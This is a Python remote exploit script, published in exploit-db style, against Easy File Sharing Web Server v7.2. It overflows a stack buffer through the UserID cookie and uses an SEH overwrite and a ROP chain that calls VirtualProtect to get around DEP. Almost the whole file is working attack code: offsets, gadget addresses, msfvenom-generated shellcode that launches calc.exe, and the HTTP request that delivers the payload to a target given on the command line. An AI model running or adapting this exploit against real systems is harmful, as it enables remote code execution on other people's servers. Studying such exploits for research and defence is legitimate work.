"""
Exploit title:      Easy File Sharing Web Server v.7.2 - UserID Cookie Stack Buffer Overflow (SEH,DEP,ASLR bypass)
Exploit Author:     Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com
Date:               03/07/2020
Vendor Homepage:    http://www.efssoft.com/
Download:           https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe
Affected Version:   v.7.2
CVE:                N/A
Tested on:          Windows 10 Pro x64 v.1909 Build 18363.418
Category:           remote exploit
Platform:           windows
Usage:              Easy_File_Sharing_Web_Server_v.7.2.py TARGET_IP 80
"""
#!/usr/bin/python
import socket, struct, argparse

parser = argparse.ArgumentParser(prog="Easy_File_Sharing_Web_Server_v.7.2.py", description="Easy File Sharing Web Server v.7.2 RCE exploit")
parser.add_argument("-t", "--target", required=True, dest="target", help="Target IP Address")
parser.add_argument("-p", "--port", default=80, type=int, dest="port", help="Target TCP Port")
args = parser.parse_args() 

host = args.target
port = args.port

buf_max_sixe = 5000
stack_pivot_offset = 2439
nseh_offset = 4059

# BAD CHARS: \x00\x0a\x0d
# !mona compare -f "C:\\logs\\fsws\\bytearray.bin" -a 0x00A588A8
# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b '\x00\x0a\x0d'
# shellcode: 220 bytes
shellcode =  b""
shellcode += b"\xba\xc3\x11\x67\x39\xda\xcc\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x31\x31\x50\x13\x83\xc0\x04"
shellcode += b"\x03\x50\xcc\xf3\x92\xc5\x3a\x71\x5c\x36\xba"
shellcode += b"\x16\xd4\xd3\x8b\x16\x82\x90\xbb\xa6\xc0\xf5"
shellcode += b"\x37\x4c\x84\xed\xcc\x20\x01\x01\x65\x8e\x77"
shellcode += b"\x2c\x76\xa3\x44\x2f\xf4\xbe\x98\x8f\xc5\x70"
shellcode += b"\xed\xce\x02\x6c\x1c\x82\xdb\xfa\xb3\x33\x68"
shellcode += b"\xb6\x0f\xbf\x22\x56\x08\x5c\xf2\x59\x39\xf3"
shellcode += b"\x89\x03\x99\xf5\x5e\x38\x90\xed\x83\x05\x6a"
shellcode += b"\x85\x77\xf1\x6d\x4f\x46\xfa\xc2\xae\x67\x09"
shellcode += b"\x1a\xf6\x4f\xf2\x69\x0e\xac\x8f\x69\xd5\xcf"
shellcode += b"\x4b\xff\xce\x77\x1f\xa7\x2a\x86\xcc\x3e\xb8"
shellcode += b"\x84\xb9\x35\xe6\x88\x3c\x99\x9c\xb4\xb5\x1c"
shellcode += b"\x73\x3d\x8d\x3a\x57\x66\x55\x22\xce\xc2\x38"
shellcode += b"\x5b\x10\xad\xe5\xf9\x5a\x43\xf1\x73\x01\x09"
shellcode += b"\x04\x01\x3f\x7f\x06\x19\x40\x2f\x6f\x28\xcb"
shellcode += b"\xa0\xe8\xb5\x1e\x85\x07\xfc\x03\xaf\x8f\x59"
shellcode += b"\xd6\xf2\xcd\x59\x0c\x30\xe8\xd9\xa5\xc8\x0f"
shellcode += b"\xc1\xcf\xcd\x54\x45\x23\xbf\xc5\x20\x43\x6c"
shellcode += b"\xe5\x60\x20\xf3\x75\xe8\x89\x96\xfd\x8b\xd5"

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
      0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll] 
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll] 
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x10013a54,  # POP EBP # RETN [ImageLoad.dll] 
      0x61c227fa,  # & push esp # ret  [sqlite3.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll]
      0xfffffaff,  # will become 0x00000501 after negate
      0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
      0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
      0x1001a858,  # ROP NOP will help ESP + C to point
      0x1001a858,  # ROP NOP
      0x10015442,  # POP EAX <- ESP + C will point here, executing the POP EAX gadget
      0x61c730ad,  # will load this address into EAX (sqlite3.dll = 0x61c00000-0x61c99000 RW)
      #[---INFO:gadgets_to_set_edx:---]
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x1001b577,  # POP ECX # RETN [ImageLoad.dll] 
      0x1004d61e,  # &Writable location [ImageLoad.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100194b3,  # POP EDI # RETN [ImageLoad.dll] 
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
    
buf = ""
buf += "A" * stack_pivot_offset
buf += create_rop_chain()
buf += "\x81\xc4\x24\xfa\xff\xff"
buf += shellcode
buf += "B" * (nseh_offset - len(buf))
buf += "CCCC" # nSEH
buf += struct.pack("<I",0x10022869) # SEH 0x10022869 : {pivot 4100 / 0x1004} :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}
# 0x100195f2 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)
# Exception handler ESP: 05B15C30
# Data on stack: ESP + 680 (1664) brginning of buffer or ESP + 1660 (5728) to reach after SEH
# 0x10022869 : {pivot 4100 / 0x1004} :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}
buf += "D" * (buf_max_sixe - len(buf))

req=("POST /forum.ghp HTTP/1.1\r\n"
"Cookie: SESSIONID=6771; UserID={}; PassWD='';\r\n\r\n"
"frmLogin=''&frmUserName=''&frmUserPass=''&login=''".format(buf))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print("[-] Sending {} bytes".format(len(buf)))

s.send(req)
data = s.recv(1024)
s.close()